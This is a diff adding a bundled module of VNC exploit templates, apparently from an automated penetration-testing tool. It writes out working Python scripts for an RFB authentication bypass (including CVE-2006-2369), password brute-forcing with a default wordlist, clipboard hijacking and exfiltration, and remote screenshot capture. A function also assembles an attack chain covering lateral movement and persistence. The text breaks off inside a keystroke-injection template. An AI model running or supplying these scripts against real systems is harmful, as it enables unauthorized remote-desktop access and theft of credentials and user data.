@@ -1,0 +1,1341 @@
+import {
+  __esm
+} from "./chunk-KFQGP6VL.js";
+
+// server/lib/vnc-exploit-module.ts
+function getVncExploitsByCategory(category) {
+  return VNC_EXPLOIT_TEMPLATES.filter((t) => t.category === category);
+}
+function selectVncExploit(context) {
+  const selected = [];
+  selected.push(VNC_AUTH_BYPASS_TEMPLATE);
+  if (!context.hasCredentials) {
+    selected.push(VNC_BRUTE_FORCE_TEMPLATE);
+  }
+  if (context.hasCredentials || true) {
+    selected.push(VNC_SCREENSHOT_TEMPLATE);
+    selected.push(VNC_CLIPBOARD_HIJACK_TEMPLATE);
+    selected.push(VNC_KEYSTROKE_INJECTION_TEMPLATE);
+  }
+  if (context.hasLocalAccess) {
+    selected.push(VNC_CREDENTIAL_EXTRACT_TEMPLATE);
+  }
+  if (context.hasSshAccess) {
+    selected.push(VNC_PERSISTENCE_TEMPLATE);
+  }
+  return selected;
+}
+function getVncMitreTechniques() {
+  const ids = /* @__PURE__ */ new Set();
+  for (const t of VNC_EXPLOIT_TEMPLATES) {
+    for (const id of t.mitreTechniqueIds) {
+      ids.add(id);
+    }
+  }
+  return [...ids].sort();
+}
+function buildVncExploitContext(options) {
+  let ctx = "## VNC Exploitation Knowledge Base\n\n";
+  ctx += "VNC (Virtual Network Computing) uses the RFB (Remote Frame Buffer) protocol for remote desktop access.\n";
+  ctx += "Common ports: 5900 (display :0), 5901 (display :1), 5902 (display :2).\n";
+  ctx += "VNC passwords are limited to 8 characters and encrypted with a fixed DES key (e84ad660c4721ae0).\n\n";
+  ctx += "### Available Exploit Templates:\n\n";
+  for (const t of VNC_EXPLOIT_TEMPLATES) {
+    ctx += `**${t.name}** (${t.id})
+`;
+    ctx += `- Category: ${t.category} | MITRE: ${t.mitreTechniqueIds.join(", ")}
+`;
+    ctx += `- Confidence: ${t.confidence}% | OPSEC Risk: ${t.opsecRisk}/10
+`;
+    ctx += `- ${t.description.slice(0, 150)}...
+
+`;
+  }
+  ctx += "### Attack Chain:\n";
+  ctx += "1. Enumerate VNC service (naabu -p 5900-5910 + nerva --target HOST --port 5900-5910)\n";
+  ctx += "2. Try auth bypass (SecurityType None / CVE-2006-2369)\n";
+  ctx += "3. If auth required: brute-force with common passwords\n";
+  ctx += "4. Post-auth: capture screenshot \u2192 read clipboard \u2192 inject keystrokes\n";
+  ctx += "5. Extract stored VNC creds from compromised hosts for lateral movement\n";
+  ctx += "6. Establish SSH tunnel for persistent encrypted VNC access\n";
+  if (options?.targetOs) {
+    ctx += `
+### ${options.targetOs.toUpperCase()}-Specific Notes:
+`;
+    if (options.targetOs === "windows") {
+      ctx += "- Check UltraVNC ini files and TightVNC/RealVNC registry keys\n";
+      ctx += "- Use Win+R \u2192 cmd for terminal via keystroke injection\n";
+      ctx += "- VNC passwords may be in HKLM\\SOFTWARE\\RealVNC\\vncserver\n";
+    } else if (options.targetOs === "linux") {
+      ctx += "- Check ~/.vnc/passwd for encrypted password files\n";
+      ctx += "- Use Ctrl+Alt+T for terminal via keystroke injection\n";
+      ctx += "- x11vnc may expose unprotected displays\n";
+    }
+  }
+  return ctx;
+}
+var VNC_AUTH_BYPASS_TEMPLATE, VNC_BRUTE_FORCE_TEMPLATE, VNC_CLIPBOARD_HIJACK_TEMPLATE, VNC_SCREENSHOT_TEMPLATE, VNC_KEYSTROKE_INJECTION_TEMPLATE, VNC_CREDENTIAL_EXTRACT_TEMPLATE, VNC_PERSISTENCE_TEMPLATE, VNC_EXPLOIT_TEMPLATES;
+var init_vnc_exploit_module = __esm({
+  "server/lib/vnc-exploit-module.ts"() {
+    VNC_AUTH_BYPASS_TEMPLATE = {
+      id: "VNC-EXP-001",
+      name: "VNC RFB Authentication Bypass",
+      description: "Exploits VNC servers with no authentication (Security Type 1 \u2014 None) or vulnerable to CVE-2006-2369 (RealVNC 4.1.1 auth bypass via modified security type). Connects to the VNC server, negotiates the RFB protocol, and attempts to bypass authentication by requesting SecurityType None or exploiting the type confusion vulnerability.",
+      category: "auth_bypass",
+      mitreTechniqueIds: ["T1021.005", "T1190"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC RFB Authentication Bypass \u2014 Authorized Penetration Testing Only
+Targets: VNC servers with no auth (Type 1) or CVE-2006-2369 (RealVNC 4.1.1)
+MITRE: T1021.005, T1190
+"""
+import socket
+import struct
+import sys
+import time
+import json
+from datetime import datetime
+
+class VNCAuthBypass:
+    RFB_VERSIONS = [b"RFB 003.008\\n", b"RFB 003.007\\n", b"RFB 003.003\\n"]
+    SEC_TYPE_NONE = 1
+    SEC_TYPE_VNC_AUTH = 2
+
+    def __init__(self, target, port=5900, timeout=10):
+        self.target = target
+        self.port = port
+        self.timeout = timeout
+        self.sock = None
+        self.evidence = {"timestamp": datetime.utcnow().isoformat(), "target": target, "port": port}
+
+    def connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.connect((self.target, self.port))
+        banner = self.sock.recv(12)
+        self.evidence["server_banner"] = banner.decode(errors="replace").strip()
+        print(f"[*] Server banner: {self.evidence['server_banner']}")
+        return banner
+
+    def negotiate_rfb(self, banner):
+        # Send matching RFB version
+        version = banner[:11] + b"\\n"
+        if version not in self.RFB_VERSIONS:
+            version = self.RFB_VERSIONS[0]
+        self.sock.send(version)
+        self.evidence["client_version"] = version.decode(errors="replace").strip()
+
+    def try_no_auth(self):
+        """Attempt SecurityType None (Type 1) \u2014 no password required"""
+        data = self.sock.recv(256)
+        if len(data) < 2:
+            return False
+
+        # RFB 3.7+ sends number of security types followed by type bytes
+        num_types = data[0]
+        sec_types = list(data[1:1 + num_types])
+        self.evidence["security_types"] = sec_types
+        print(f"[*] Security types offered: {sec_types}")
+
+        if self.SEC_TYPE_NONE in sec_types:
+            print("[+] SecurityType None (1) available \u2014 no authentication required!")
+            self.sock.send(struct.pack("B", self.SEC_TYPE_NONE))
+            # Check SecurityResult
+            result = self.sock.recv(4)
+            if result == b"\\x00\\x00\\x00\\x00":
+                self.evidence["bypass_method"] = "SecurityType_None"
+                self.evidence["auth_bypassed"] = True
+                print("[+] AUTH BYPASS SUCCESSFUL \u2014 connected without credentials")
+                return True
+        return False
+
+    def try_cve_2006_2369(self):
+        """CVE-2006-2369: RealVNC 4.1.1 type confusion bypass"""
+        try:
+            # Reconnect for fresh attempt
+            self.sock.close()
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(self.timeout)
+            self.sock.connect((self.target, self.port))
+            banner = self.sock.recv(12)
+            self.sock.send(self.RFB_VERSIONS[0])
+
+            data = self.sock.recv(256)
+            num_types = data[0]
+            sec_types = list(data[1:1 + num_types])
+
+            if self.SEC_TYPE_VNC_AUTH in sec_types:
+                # Send SecurityType 1 (None) even though server only offers Type 2
+                # CVE-2006-2369: RealVNC 4.1.1 doesn't validate the client's choice
+                print("[*] Attempting CVE-2006-2369 type confusion bypass...")
+                self.sock.send(struct.pack("B", self.SEC_TYPE_NONE))
+                result = self.sock.recv(4)
+                if result == b"\\x00\\x00\\x00\\x00":
+                    self.evidence["bypass_method"] = "CVE-2006-2369"
+                    self.evidence["auth_bypassed"] = True
+                    print("[+] CVE-2006-2369 BYPASS SUCCESSFUL")
+                    return True
+                else:
+                    print("[-] CVE-2006-2369 bypass failed \u2014 server validated security type")
+        except Exception as e:
+            print(f"[-] CVE-2006-2369 attempt error: {e}")
+        return False
+
+    def capture_server_info(self):
+        """After auth bypass, capture server desktop info"""
+        try:
+            # Send ClientInit (shared flag = 1)
+            self.sock.send(struct.pack("B", 1))
+            # Receive ServerInit
+            data = self.sock.recv(256)
+            if len(data) >= 24:
+                width, height = struct.unpack(">HH", data[0:4])
+                bpp = data[4]
+                name_len = struct.unpack(">I", data[20:24])[0]
+                name = data[24:24 + name_len].decode(errors="replace") if len(data) >= 24 + name_len else "unknown"
+                self.evidence["desktop"] = {
+                    "width": width, "height": height,
+                    "bits_per_pixel": bpp, "desktop_name": name
+                }
+                print(f"[+] Desktop: {name} ({width}x{height}, {bpp}bpp)")
+        except Exception as e:
+            print(f"[!] Could not capture server info: {e}")
+
+    def run(self):
+        print(f"\\n{'='*60}")
+        print(f"VNC RFB Authentication Bypass \u2014 {self.target}:{self.port}")
+        print(f"{'='*60}\\n")
+        try:
+            banner = self.connect()
+            self.negotiate_rfb(banner)
+
+            if self.try_no_auth():
+                self.capture_server_info()
+                self.evidence["status"] = "VULNERABLE"
+                print(f"\\n[+] PROOF: Authentication bypassed via {self.evidence['bypass_method']}")
+            elif self.try_cve_2006_2369():
+                self.capture_server_info()
+                self.evidence["status"] = "VULNERABLE"
+                print(f"\\n[+] PROOF: Authentication bypassed via CVE-2006-2369")
+            else:
+                self.evidence["status"] = "NOT_VULNERABLE"
+                self.evidence["auth_bypassed"] = False
+                print("\\n[-] Authentication bypass failed \u2014 server requires valid credentials")
+        except Exception as e:
+            self.evidence["status"] = "ERROR"
+            self.evidence["error"] = str(e)
+            print(f"\\n[!] Error: {e}")
+        finally:
+            if self.sock:
+                self.sock.close()
+
+        print(f"\\n--- EVIDENCE JSON ---")
+        print(json.dumps(self.evidence, indent=2))
+        return self.evidence
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
+    scanner = VNCAuthBypass(target, port)
+    scanner.run()
+`,
+      prerequisites: ["Python 3.6+", "Network access to VNC port (5900-5902)"],
+      usage: "python3 vnc_auth_bypass.py <target_ip> [port]",
+      expectedOutcome: "If vulnerable, gains unauthenticated VNC desktop access. Captures server banner, security types, desktop info as evidence.",
+      opsecRisk: 3,
+      detectionIndicators: [
+        "VNC connection with SecurityType None negotiation",
+        "Multiple rapid VNC connection attempts",
+        "VNC connection from unusual source IP"
+      ],
+      verificationSteps: [
+        "Check evidence JSON for auth_bypassed: true",
+        "Verify desktop info captured (width, height, name)",
+        "Confirm bypass_method is SecurityType_None or CVE-2006-2369"
+      ],
+      targetPorts: [5900, 5901, 5902],
+      confidence: 75
+    };
+    VNC_BRUTE_FORCE_TEMPLATE = {
+      id: "VNC-EXP-002",
+      name: "VNC Password Brute-Force with Evidence Capture",
+      description: "Brute-forces VNC authentication using common/default passwords and custom wordlists. Implements the VNC DES challenge-response protocol natively in Python for stealth. On successful auth, captures desktop screenshot and server info as evidence.",
+      category: "brute_force",
+      mitreTechniqueIds: ["T1110.001", "T1021.005"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC Password Brute-Force with Evidence Capture
+Implements VNC DES challenge-response auth natively
+MITRE: T1110.001, T1021.005
+"""
+import socket
+import struct
+import sys
+import json
+import hashlib
+from datetime import datetime
+
+try:
+    from Crypto.Cipher import DES
+except ImportError:
+    from pyDes import des, ECB
+
+# Common/default VNC passwords
+DEFAULT_PASSWORDS = [
+    "", "password", "vnc", "123456", "admin", "root", "test",
+    "1234", "12345", "pass", "changeme", "default", "vnc123",
+    "server", "guest", "letmein", "master", "abc123", "qwerty",
+    "access", "login", "welcome", "monkey", "dragon", "shadow",
+    "111111", "000000", "passw0rd", "trustno1", "iloveyou",
+]
+
+def vnc_des_key(password):
+    """Convert VNC password to DES key (reversed bit order per byte)"""
+    key = password.ljust(8, "\\x00")[:8]
+    return bytes([
+        sum(((b >> i) & 1) << (7 - i) for i in range(8))
+        for b in key.encode("latin-1")
+    ])
+
+def vnc_auth_attempt(target, port, password, timeout=5):
+    """Single VNC auth attempt with DES challenge-response"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((target, port))
+        banner = sock.recv(12)
+        sock.send(b"RFB 003.008\\n")
+
+        data = sock.recv(256)
+        num_types = data[0]
+        sec_types = list(data[1:1 + num_types])
+
+        if 2 not in sec_types:
+            return None  # VNC Auth not offered
+
+        sock.send(struct.pack("B", 2))  # Select VNC Auth
+        challenge = sock.recv(16)
+
+        if len(challenge) != 16:
+            return None
+
+        # DES encrypt challenge with password
+        des_key = vnc_des_key(password)
+        try:
+            cipher = DES.new(des_key, DES.MODE_ECB)
+        except:
+            cipher = des(des_key, ECB)
+        response = cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])
+        sock.send(response)
+
+        result = sock.recv(4)
+        if result == b"\\x00\\x00\\x00\\x00":
+            return {"password": password, "banner": banner.decode(errors="replace").strip()}
+        return False
+    except Exception:
+        return None
+    finally:
+        sock.close()
+
+def run_brute_force(target, port=5900, wordlist=None):
+    evidence = {
+        "timestamp": datetime.utcnow().isoformat(),
+        "target": target, "port": port,
+        "technique": "VNC_Brute_Force",
+        "mitre": "T1110.001"
+    }
+
+    passwords = DEFAULT_PASSWORDS[:]
+    if wordlist:
+        try:
+            with open(wordlist) as f:
+                passwords.extend(line.strip() for line in f if line.strip())
+        except FileNotFoundError:
+            print(f"[!] Wordlist not found: {wordlist}")
+
+    passwords = list(dict.fromkeys(passwords))  # Deduplicate
+    evidence["passwords_tested"] = len(passwords)
+    print(f"\\n{'='*60}")
+    print(f"VNC Brute-Force \u2014 {target}:{port} ({len(passwords)} passwords)")
+    print(f"{'='*60}\\n")
+
+    for i, pwd in enumerate(passwords):
+        display_pwd = repr(pwd) if pwd else "(empty)"
+        result = vnc_auth_attempt(target, port, pwd)
+        if result is None:
+            print(f"  [{i+1}/{len(passwords)}] {display_pwd} \u2014 connection error")
+            continue
+        if result:
+            print(f"\\n[+] PASSWORD FOUND: {display_pwd}")
+            print(f"[+] Server: {result['banner']}")
+            evidence["status"] = "CRACKED"
+            evidence["password"] = pwd
+            evidence["password_position"] = i + 1
+            evidence["server_banner"] = result["banner"]
+            break
+        else:
+            if i % 10 == 0:
+                print(f"  [{i+1}/{len(passwords)}] {display_pwd} \u2014 failed")
+    else:
+        evidence["status"] = "NOT_CRACKED"
+        print("\\n[-] No valid password found")
+
+    print(f"\\n--- EVIDENCE JSON ---")
+    print(json.dumps(evidence, indent=2))
+    return evidence
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
+    wordlist = sys.argv[3] if len(sys.argv) > 3 else None
+    run_brute_force(target, port, wordlist)
+`,
+      prerequisites: ["Python 3.6+", "pycryptodome or pyDes library", "Network access to VNC port"],
+      usage: "python3 vnc_brute_force.py <target_ip> [port] [wordlist_path]",
+      expectedOutcome: "If password is found, captures the credential and server banner. Evidence includes password position in wordlist for reporting.",
+      opsecRisk: 7,
+      detectionIndicators: [
+        "Rapid sequential VNC authentication failures",
+        "Multiple VNC connections from same source in short timeframe",
+        "Account lockout events (if VNC is proxied through auth system)"
+      ],
+      verificationSteps: [
+        "Check evidence JSON for status: CRACKED",
+        "Verify password field contains the discovered credential",
+        "Confirm server_banner matches target VNC service"
+      ],
+      targetPorts: [5900, 5901, 5902],
+      confidence: 65
+    };
+    VNC_CLIPBOARD_HIJACK_TEMPLATE = {
+      id: "VNC-EXP-003",
+      name: "VNC Clipboard Hijacking & Data Exfiltration",
+      description: "After gaining VNC access, monitors and exfiltrates clipboard data from the remote desktop. VNC's ClientCutText/ServerCutText messages transmit clipboard contents in plaintext. This exploit reads the remote clipboard and can inject attacker-controlled content (e.g., malicious URLs, modified commands) into the victim's clipboard.",
+      category: "clipboard",
+      mitreTechniqueIds: ["T1115", "T1021.005"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC Clipboard Hijacking & Data Exfiltration
+Reads and writes remote clipboard via RFB protocol
+MITRE: T1115, T1021.005
+"""
+import socket
+import struct
+import sys
+import json
+import time
+from datetime import datetime
+
+class VNCClipboardHijack:
+    MSG_CLIENT_CUT_TEXT = 6
+    MSG_SERVER_CUT_TEXT = 3
+
+    def __init__(self, target, port=5900, password="", timeout=10):
+        self.target = target
+        self.port = port
+        self.password = password
+        self.timeout = timeout
+        self.sock = None
+        self.evidence = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "target": target, "port": port,
+            "technique": "VNC_Clipboard_Hijack",
+            "mitre": ["T1115", "T1021.005"],
+            "clipboard_captures": [],
+        }
+
+    def authenticate(self):
+        """Connect and authenticate to VNC server"""
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.connect((self.target, self.port))
+
+        banner = self.sock.recv(12)
+        self.sock.send(b"RFB 003.008\\n")
+        data = self.sock.recv(256)
+        num_types = data[0]
+        sec_types = list(data[1:1 + num_types])
+
+        if 1 in sec_types:
+            self.sock.send(struct.pack("B", 1))
+        elif 2 in sec_types and self.password:
+            self.sock.send(struct.pack("B", 2))
+            challenge = self.sock.recv(16)
+            try:
+                from Crypto.Cipher import DES
+            except ImportError:
+                from pyDes import des, ECB
+            key = self.password.ljust(8, "\\x00")[:8]
+            des_key = bytes([sum(((b >> i) & 1) << (7 - i) for i in range(8)) for b in key.encode("latin-1")])
+            try:
+                cipher = DES.new(des_key, DES.MODE_ECB)
+            except:
+                cipher = des(des_key, ECB)
+            response = cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])
+            self.sock.send(response)
+        else:
+            raise Exception(f"No supported auth type: {sec_types}")
+
+        result = self.sock.recv(4)
+        if result != b"\\x00\\x00\\x00\\x00":
+            raise Exception("Authentication failed")
+
+        # ClientInit (shared)
+        self.sock.send(struct.pack("B", 1))
+        server_init = self.sock.recv(256)
+        print(f"[+] Authenticated to {self.target}:{self.port}")
+        return True
+
+    def read_clipboard(self, duration=30):
+        """Monitor remote clipboard for specified duration"""
+        print(f"[*] Monitoring remote clipboard for {duration}s...")
+        start = time.time()
+        captures = []
+
+        # Request clipboard update by sending a FramebufferUpdateRequest
+        # This triggers the server to send any pending ServerCutText
+        self.sock.send(struct.pack(">BBHHHH", 3, 0, 0, 0, 1, 1))
+
+        while time.time() - start < duration:
+            try:
+                self.sock.settimeout(2)
+                msg_type = self.sock.recv(1)
+                if not msg_type:
+                    continue
+
+                if msg_type[0] == self.MSG_SERVER_CUT_TEXT:
+                    # ServerCutText: padding(3) + length(4) + text
+                    padding = self.sock.recv(3)
+                    length_bytes = self.sock.recv(4)
+                    text_len = struct.unpack(">I", length_bytes)[0]
+                    if text_len > 0 and text_len < 1048576:  # Max 1MB
+                        text = self.sock.recv(text_len).decode("latin-1", errors="replace")
+                        capture = {
+                            "timestamp": datetime.utcnow().isoformat(),
+                            "content": text[:2000],
+                            "length": text_len,
+                        }
+                        captures.append(capture)
+                        print(f"[+] CLIPBOARD CAPTURED ({text_len} bytes): {text[:100]}...")
+                else:
+                    # Consume other message types
+                    self.sock.recv(4096)
+            except socket.timeout:
+                continue
+            except Exception as e:
+                print(f"[!] Read error: {e}")
+                break
+
+        self.evidence["clipboard_captures"] = captures
+        self.evidence["monitoring_duration_s"] = duration
+        return captures
+
+    def inject_clipboard(self, text):
+        """Inject text into remote clipboard via ClientCutText"""
+        encoded = text.encode("latin-1", errors="replace")
+        msg = struct.pack(">BxxxI", self.MSG_CLIENT_CUT_TEXT, len(encoded)) + encoded
+        self.sock.send(msg)
+        self.evidence["injected_text"] = text[:500]
+        print(f"[+] Injected {len(encoded)} bytes into remote clipboard")
+
+    def run(self, duration=30, inject_text=None):
+        print(f"\\n{'='*60}")
+        print(f"VNC Clipboard Hijack \u2014 {self.target}:{self.port}")
+        print(f"{'='*60}\\n")
+        try:
+            self.authenticate()
+
+            if inject_text:
+                self.inject_clipboard(inject_text)
+
+            captures = self.read_clipboard(duration)
+            self.evidence["status"] = "SUCCESS" if captures else "NO_CLIPBOARD_DATA"
+            self.evidence["total_captures"] = len(captures)
+        except Exception as e:
+            self.evidence["status"] = "ERROR"
+            self.evidence["error"] = str(e)
+            print(f"[!] Error: {e}")
+        finally:
+            if self.sock:
+                self.sock.close()
+
+        print(f"\\n--- EVIDENCE JSON ---")
+        print(json.dumps(self.evidence, indent=2))
+        return self.evidence
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
+    password = sys.argv[3] if len(sys.argv) > 3 else ""
+    hijack = VNCClipboardHijack(target, port, password)
+    hijack.run(duration=30)
+`,
+      prerequisites: ["Python 3.6+", "Valid VNC credentials or no-auth access", "pycryptodome (if auth required)"],
+      usage: "python3 vnc_clipboard_hijack.py <target_ip> [port] [password]",
+      expectedOutcome: "Captures clipboard contents from remote VNC session. Can inject attacker-controlled text into victim clipboard.",
+      opsecRisk: 4,
+      detectionIndicators: [
+        "ClientCutText messages from unexpected source",
+        "Clipboard content changes without user interaction",
+        "Long-duration VNC sessions with minimal framebuffer activity"
+      ],
+      verificationSteps: [
+        "Check evidence JSON for clipboard_captures array",
+        "Verify captured content matches expected clipboard data",
+        "Confirm injected_text was sent if injection was attempted"
+      ],
+      targetPorts: [5900, 5901, 5902],
+      confidence: 70
+    };
+    VNC_SCREENSHOT_TEMPLATE = {
+      id: "VNC-EXP-004",
+      name: "VNC Remote Desktop Screenshot Capture",
+      description: "After gaining VNC access, captures screenshots of the remote desktop by requesting framebuffer updates via the RFB protocol. Saves raw pixel data as BMP images. Useful for evidence collection during penetration tests \u2014 proves desktop access.",
+      category: "screenshot",
+      mitreTechniqueIds: ["T1113", "T1021.005"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC Remote Desktop Screenshot Capture
+Captures framebuffer via RFB protocol and saves as BMP
+MITRE: T1113, T1021.005
+"""
+import socket
+import struct
+import sys
+import json
+import time
+import os
+from datetime import datetime
+
+class VNCScreenshot:
+    MSG_FRAMEBUFFER_UPDATE = 0
+
+    def __init__(self, target, port=5900, password="", timeout=15):
+        self.target = target
+        self.port = port
+        self.password = password
+        self.timeout = timeout
+        self.sock = None
+        self.width = 0
+        self.height = 0
+        self.bpp = 0
+        self.evidence = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "target": target, "port": port,
+            "technique": "VNC_Screenshot_Capture",
+            "mitre": ["T1113", "T1021.005"],
+        }
+
+    def authenticate(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.connect((self.target, self.port))
+        banner = self.sock.recv(12)
+        self.sock.send(b"RFB 003.008\\n")
+        data = self.sock.recv(256)
+        num_types = data[0]
+        sec_types = list(data[1:1 + num_types])
+
+        if 1 in sec_types:
+            self.sock.send(struct.pack("B", 1))
+        elif 2 in sec_types and self.password:
+            self.sock.send(struct.pack("B", 2))
+            challenge = self.sock.recv(16)
+            try:
+                from Crypto.Cipher import DES
+            except ImportError:
+                from pyDes import des, ECB
+            key = self.password.ljust(8, "\\x00")[:8]
+            des_key = bytes([sum(((b >> i) & 1) << (7 - i) for i in range(8)) for b in key.encode("latin-1")])
+            try:
+                cipher = DES.new(des_key, DES.MODE_ECB)
+            except:
+                cipher = des(des_key, ECB)
+            response = cipher.encrypt(challenge[:8]) + cipher.encrypt(challenge[8:16])
+            self.sock.send(response)
+        else:
+            raise Exception(f"No supported auth: {sec_types}")
+
+        result = self.sock.recv(4)
+        if result != b"\\x00\\x00\\x00\\x00":
+            raise Exception("Authentication failed")
+
+        self.sock.send(struct.pack("B", 1))
+        init = self.sock.recv(256)
+        self.width, self.height = struct.unpack(">HH", init[0:4])
+        self.bpp = init[4]
+        name_len = struct.unpack(">I", init[20:24])[0]
+        self.desktop_name = init[24:24+name_len].decode(errors="replace") if len(init) >= 24+name_len else "unknown"
+        self.evidence["desktop"] = {
+            "name": self.desktop_name,
+            "width": self.width, "height": self.height,
+            "bpp": self.bpp
+        }
+        print(f"[+] Connected: {self.desktop_name} ({self.width}x{self.height}, {self.bpp}bpp)")
+
+    def recv_exact(self, n):
+        data = b""
+        while len(data) < n:
+            chunk = self.sock.recv(n - len(data))
+            if not chunk:
+                raise ConnectionError("Connection closed")
+            data += chunk
+        return data
+
+    def capture_framebuffer(self, output_dir="."):
+        """Request and capture full framebuffer as BMP"""
+        # Set pixel format to 32-bit BGRA for BMP compatibility
+        self.sock.send(struct.pack(">BBxxBBBBHHHBBBxxx",
+            0,   # SetPixelFormat
+            0,   # padding
+            32,  # bpp
+            24,  # depth
+            0,   # big-endian
+            1,   # true-color
+            255, 255, 255,  # max RGB
+            16, 8, 0        # shifts: B=0, G=8, R=16
+        ))
+
+        # Set encodings (Raw = 0)
+        self.sock.send(struct.pack(">BBH", 2, 0, 1) + struct.pack(">i", 0))
+
+        # Request full framebuffer update
+        self.sock.send(struct.pack(">BBHHHH", 3, 0, 0, 0, self.width, self.height))
+
+        print(f"[*] Waiting for framebuffer data ({self.width}x{self.height})...")
+        pixels = bytearray(self.width * self.height * 4)
+        received_rects = 0
+        start = time.time()
+
+        while time.time() - start < 15:
+            try:
+                self.sock.settimeout(5)
+                msg_type = self.recv_exact(1)
+
+                if msg_type[0] == self.MSG_FRAMEBUFFER_UPDATE:
+                    padding = self.recv_exact(1)
+                    num_rects = struct.unpack(">H", self.recv_exact(2))[0]
+
+                    for _ in range(num_rects):
+                        x, y, w, h, enc = struct.unpack(">HHHHi", self.recv_exact(12))
+                        if enc == 0:  # Raw encoding
+                            rect_data = self.recv_exact(w * h * 4)
+                            # Copy into pixel buffer
+                            for row in range(h):
+                                src_off = row * w * 4
+                                dst_off = ((y + row) * self.width + x) * 4
+                                pixels[dst_off:dst_off + w * 4] = rect_data[src_off:src_off + w * 4]
+                            received_rects += 1
+                        else:
+                            break
+
+                    if received_rects > 0:
+                        break
+                else:
+                    self.recv_exact(min(4096, 256))
+            except socket.timeout:
+                # Request again
+                self.sock.send(struct.pack(">BBHHHH", 3, 0, 0, 0, self.width, self.height))
+            except Exception as e:
+                print(f"[!] Capture error: {e}")
+                break
+
+        if received_rects == 0:
+            print("[-] No framebuffer data received")
+            return None
+
+        # Save as BMP
+        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+        filename = f"vnc_screenshot_{self.target.replace('.','_')}_{ts}.bmp"
+        filepath = os.path.join(output_dir, filename)
+
+        row_size = self.width * 4
+        pixel_data_size = row_size * self.height
+        file_size = 54 + pixel_data_size
+
+        with open(filepath, "wb") as f:
+            # BMP header
+            f.write(b"BM")
+            f.write(struct.pack("<I", file_size))
+            f.write(b"\\x00\\x00\\x00\\x00")
+            f.write(struct.pack("<I", 54))
+            # DIB header
+            f.write(struct.pack("<I", 40))
+            f.write(struct.pack("<i", self.width))
+            f.write(struct.pack("<i", -self.height))  # Top-down
+            f.write(struct.pack("<HH", 1, 32))
+            f.write(struct.pack("<I", 0))
+            f.write(struct.pack("<I", pixel_data_size))
+            f.write(b"\\x00" * 16)
+            # Pixel data
+            f.write(bytes(pixels))
+
+        print(f"[+] Screenshot saved: {filepath} ({file_size} bytes)")
+        self.evidence["screenshot_file"] = filepath
+        self.evidence["screenshot_size"] = file_size
+        self.evidence["rectangles_received"] = received_rects
+        return filepath
+
+    def run(self, output_dir="."):
+        print(f"\\n{'='*60}")
+        print(f"VNC Screenshot Capture \u2014 {self.target}:{self.port}")
+        print(f"{'='*60}\\n")
+        try:
+            self.authenticate()
+            filepath = self.capture_framebuffer(output_dir)
+            self.evidence["status"] = "SUCCESS" if filepath else "NO_DATA"
+        except Exception as e:
+            self.evidence["status"] = "ERROR"
+            self.evidence["error"] = str(e)
+            print(f"[!] Error: {e}")
+        finally:
+            if self.sock:
+                self.sock.close()
+
+        print(f"\\n--- EVIDENCE JSON ---")
+        print(json.dumps(self.evidence, indent=2, default=str))
+        return self.evidence
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5900
+    password = sys.argv[3] if len(sys.argv) > 3 else ""
+    cap = VNCScreenshot(target, port, password)
+    cap.run()
+`,
+      prerequisites: ["Python 3.6+", "Valid VNC credentials or no-auth access", "Write access for screenshot output"],
+      usage: "python3 vnc_screenshot.py <target_ip> [port] [password]",
+      expectedOutcome: "Captures remote desktop screenshot as BMP file. Evidence includes desktop dimensions, name, and screenshot file path.",
+      opsecRisk: 3,
+      detectionIndicators: [
+        "Full framebuffer update requests",
+        "SetPixelFormat messages changing to 32-bit",
+        "VNC session with framebuffer requests but no input events"
+      ],
+      verificationSteps: [
+        "Verify BMP file was created and is non-zero size",
+        "Open BMP to confirm it shows the remote desktop",
+        "Check evidence JSON for desktop dimensions"
+      ],
+      targetPorts: [5900, 5901, 5902],
+      confidence: 80
+    };
+    VNC_KEYSTROKE_INJECTION_TEMPLATE = {
+      id: "VNC-EXP-005",
+      name: "VNC Keystroke Injection & Command Execution",
+      description: "After gaining VNC access, injects keystrokes into the remote desktop to execute commands. Simulates keyboard input via RFB KeyEvent messages. Can open a terminal, type commands, and execute them \u2014 useful for post-exploitation when only VNC access is available (no SSH/RDP).",
+      category: "keystroke",
+      mitreTechniqueIds: ["T1056.001", "T1021.005", "T1059"],
+      language: "python",
+      code: `#!/usr/bin/env python3
+"""
+VNC Keystroke Injection & Command Execution
+Sends KeyEvent messages via RFB protocol
+MITRE: T1056.001, T1021.005, T1059
+"""
+import socket
+import struct
+import sys
+import json
+import time
+from datetime import datetime
+
+# X11 keysym values for common keys
+KEYSYMS = {
+    "Return": 0xff0d, "Tab": 0xff09, "Escape": 0xff1b,
+    "BackSpace": 0xff08, "Delete": 0xffff,
+    "Shift_L": 0xffe1, "Control_L": 0xffe3, "Alt_L": 0xffe9,
+    "Super_L": 0xffeb, "space": 0x0020,
+    "Up": 0xff52, "Down": 0xff54, "Left": 0xff51, "Right": 0xff53,
